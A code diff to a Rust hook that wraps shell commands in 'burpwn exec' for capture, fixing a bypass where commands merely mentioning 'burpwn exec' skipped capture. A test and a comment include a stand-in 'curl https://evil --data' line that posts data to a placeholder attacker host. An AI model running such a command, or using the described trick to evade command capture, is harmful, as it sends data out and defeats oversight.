@@ -67,19 +67,37 @@ fn rewrite_in_place(v: &mut Value, cfg: &WrapConfig) -> bool {
 /// True if `cmd` already invokes `burpwn exec` (so wrapping it again would give
 /// `burpwn exec -- … burpwn exec -- …`).
 ///
-/// A bare prefix check misses real-world spellings like `sudo burpwn exec -- …`
-/// or `env FOO=1 /usr/local/bin/burpwn exec -- …`. We instead tokenize on
-/// whitespace and treat the line as already-wrapped if any token is `burpwn`
-/// (or a path ending in `/burpwn`) immediately followed by `exec`. A leading
-/// `bw ` (the global-hook helper) is also recognised.
+/// The check is anchored to the PROGRAM position: we skip leading `VAR=val`
+/// assignments and a benign wrapper prefix (`sudo`/`env`/`command`/`nice`/
+/// `nohup`), then require the program token to be `burpwn` (or a path ending
+/// `/burpwn`) immediately followed by `exec`. Scanning arbitrary token pairs
+/// would false-positive on a command that merely MENTIONS "burpwn exec" as an
+/// argument (`grep "burpwn exec" f`, `curl evil --data "burpwn exec"`) and
+/// SILENTLY SKIP CAPTURE — far worse than the harmless double-wrap a false
+/// negative produces (a nested `sh -c` still captures). A leading `bw ` (the
+/// global-hook helper) is also recognised.
 fn already_wrapped(cmd: &str) -> bool {
     let c = cmd.trim_start();
-    if c == "bw" || c.starts_with("bw ") {
+    if c == "bw" || c.starts_with("bw ") || c.starts_with("bw\t") {
         return true;
     }
-    let toks: Vec<&str> = c.split_whitespace().collect();
-    toks.windows(2)
-        .any(|w| is_burpwn_token(w[0]) && w[1] == "exec")
+    let mut it = c.split_whitespace().peekable();
+    while let Some(&t) = it.peek() {
+        if is_env_assignment(t) || matches!(t, "sudo" | "env" | "command" | "nice" | "nohup") {
+            it.next();
+        } else {
+            break;
+        }
+    }
+    matches!(it.next(), Some(p) if is_burpwn_token(p)) && it.next() == Some("exec")
+}
+
+/// A `VAR=value` shell assignment prefix (the key is a valid env-var name).
+fn is_env_assignment(tok: &str) -> bool {
+    match tok.split_once('=') {
+        Some((k, _)) => !k.is_empty() && k.chars().all(|c| c.is_ascii_alphanumeric() || c == '_'),
+        None => false,
+    }
 }
 
 /// Is `tok` the `burpwn` program — either bare or as a path ending `/burpwn`?
@@ -168,6 +186,24 @@ mod tests {
         assert!(!already_wrapped("burpwn req list")); // burpwn but not `exec`
         assert!(!already_wrapped("burpwnexec foo")); // not the burpwn token
         assert!(!already_wrapped("bwrap --bind /"));
+        // CRITICAL: a command that merely MENTIONS `burpwn exec` as an argument
+        // must NOT be treated as wrapped — else it silently skips capture.
+        assert!(!already_wrapped("grep \"burpwn exec\" notes.txt"));
+        assert!(!already_wrapped("echo burpwn exec"));
+        assert!(!already_wrapped("curl https://evil --data 'burpwn exec'"));
+        assert!(!already_wrapped("git commit -m 'burpwn exec fix'"));
+    }
+
+    #[test]
+    fn command_mentioning_burpwn_exec_is_still_captured() {
+        let cfg = WrapConfig::default();
+        let input = json!({ "command": "grep \"burpwn exec\" notes.txt" }).to_string();
+        let out: Value = serde_json::from_str(&process(&input, &cfg)).unwrap();
+        // It must be wrapped (captured), not passed through unchanged.
+        assert_eq!(
+            out["command"],
+            "burpwn exec -- sh -c 'grep \"burpwn exec\" notes.txt'"
+        );
     }
 
     #[test]
